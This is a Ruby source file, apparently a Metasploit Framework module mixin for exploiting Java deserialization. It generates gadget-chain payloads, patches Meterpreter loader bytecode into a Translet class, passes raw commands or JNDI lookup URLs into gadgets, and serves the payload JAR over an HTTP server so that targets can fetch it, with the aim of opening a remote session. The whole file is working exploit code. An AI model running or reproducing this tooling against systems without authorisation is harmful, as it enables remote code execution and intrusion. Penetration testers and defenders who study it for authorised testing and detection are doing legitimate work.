# -*- coding: binary -*-

require 'rex/java/serialization/generator'
require 'rex/java/classfile'

module Msf
  module Exploit::Java::Serialized
    include Msf::Exploit::Remote::HttpServer

    def initialize(info = {})
      super

      register_options([
        OptString.new('GADGETS', [false, 'Gadgets to use in exploitation', ''])
      ])
    end

    def check
      vectors = collect
      unless vectors.empty?
        vectors.each do |vector|
          info vector.to_s
        end
        return Exploit::CheckCode::Appears
      end
      Exploit::CheckCode::Safe
    end

    def exploit
      start_service

      vectors = collect
      vectors.each do |vector|
        if session_created?
          print_status 'Have a session, not trying further'
          break
        end
        do_exploit(vector)
      end

      handler(nil)
      unless vectors.empty?
        begin
          print_status 'Waiting for exploit to complete...'
          Timeout.timeout(datastore['ListenerTimeout']) do
            loop do
              break if session_created?
              Rex.sleep(0.25)
            end

            print_status 'Have session...'
          end
        rescue ::Timeout::Error
          fail_with(Failure::Unknown, 'Timeout waiting for exploit to complete')
        end
      end

      stop_service
    end


    class DatastoreRunConfig < Rex::Java::Serialization::Generator::GeneratorConfig
      def initialize(props)
        @props = props
      end

      def gadgets
        @props['GADGETS']
      end
    end

    def create_config(datastore)
      DatastoreRunConfig.new(datastore)
    end

    def payloads(ctx, &block)
      config = create_config(datastore)
      p = create_params(ctx)
      gadgets = Rex::Java::Serialization::Generator::BuiltinGadgets.new
      matches = gadgets.find(ctx, params: p, rc: config)
      if block
        matches.each do |match|
          yield match.create(ctx, params: p)
        end
      else
        payloads = []
        matches.each do |match|
          payloads.push(match.create(ctx, params: p))
        end
        payloads
      end
    end

    def loader_classes(jar, mainclass, xalan: false)
      translet = 'metasploit/TransletPayload.class'
      if xalan
        translet = 'metasploit/TransletXalanPayload.class'
      end

      includes = [
        'com/metasploit/meterpreter/MemoryBufferURLStreamHandler.class',
        'com/metasploit/meterpreter/MemoryBufferURLConnection.class',
      ]
      rand = (0...8).map { (65 + rand(26)).chr }.join
      loadername = 'Translet' + rand
      bytecode =  Rex::Java::Classfile::Templates.patch_loader(
        MetasploitPayloads.read("java", translet), 
        loadername, 
        jar, 
        mainclass:mainclass)
      classes = [['metasploit/' + loadername, bytecode]]
      includes.each do |include|
        classes += [[include, MetasploitPayloads.read("java", include)]]
      end
      classes
    end

    def create_templates_jar_loader(payload, xalan: false)
      jar = payload.encoded_jar
      manifest = extract_file(jar, "META-INF/MANIFEST.MF")
      mainclass = nil
      manifest.split("\r\n").each do |line|
        mainclass = line.split()[1] if line.downcase.start_with?("main-class: ")
      end

      print_error('Failed to determine main class') if mainclass.nil?
      print_status('Trying to invoke bytecode, main class ' + mainclass)


      loader_classes(jar.pack, mainclass)
    end

    def create_params(ctx)
      # TODO: randomize static payload class name
      gparams = { 
        'classpath' => get_uri + '/',
        'class' => 'metasploit.StaticPayload'
      }

      ptype = payload_instance.fullname
      if ptype == 'payload/cmd/unix/generic' ||
          ptype == 'payload/cmd/windows/generic'
        print_status('Trying direct command execution ' + payload.raw)
        gparams["cmd"] = payload.raw
      elsif ptype == 'payload/java/jndi'
        jndiurl = payload_instance.datastore["JNDI_URL"]
        print_status('Trying to invoke JNDI lookup to ' + jndiurl + ' additional setup required')
        gparams["jndiurl"] = jndiurl
      else
        jar = payload.encoded_jar
        bytecodes = create_templates_jar_loader(
          payload,
          xalan: Rex::Java::Serialization::Generator::Templates::use_xalan?(ctx))
        gparams['classfiles'] = bytecodes
      end
      gparams
    end

    def extract_file(zip,name)
      zip.entries.each do |entry|
        return entry.data if entry.name == name
      end 
    end

    def extra_http_classes
      []
    end

    def get_jar
      if @jar.nil?
        p = regenerate_payload(cli)
        @jar = p.encoded_jar({"random":true})
        @jar.add_files(extra_http_classes, MetasploitPayloads.path('java'))
      end
      @jar
    end

    def on_request_uri(cli, request)
      jar = get_jar
      if request.uri =~ /\.jar$/i
        send_response(cli, jar.pack, {
          'Content-Type' => 'application/java-archive',
          'Pragma'       => 'no-cache'
        })
        print_status('Replied to request for payload JAR')
      else
        print_status('Request for file ' + request.uri)
        contents = extract_file(jar,request.uri)
        if contents.nil?
          send_not_found(cli)
        else
          send_response(cli,contents, {
            'Content-Type' => 'application/octet-stream',
            'Pragma'       => 'no-cache'
          })
        end
      end
    end
  end
end
